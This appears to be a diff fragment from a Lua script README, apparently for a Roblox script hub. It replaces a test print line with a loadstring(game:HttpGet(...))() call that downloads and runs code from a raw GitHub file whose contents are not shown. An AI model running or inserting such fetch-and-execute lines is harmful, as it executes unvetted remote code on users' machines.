@@ -10,5 +10,5 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/XOTRXONY/AUREATE/main
 ```
 
 ```lua
-print("w")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XOTRXONY/AUREATE/main/HOWCANFYOU"))()
 ```
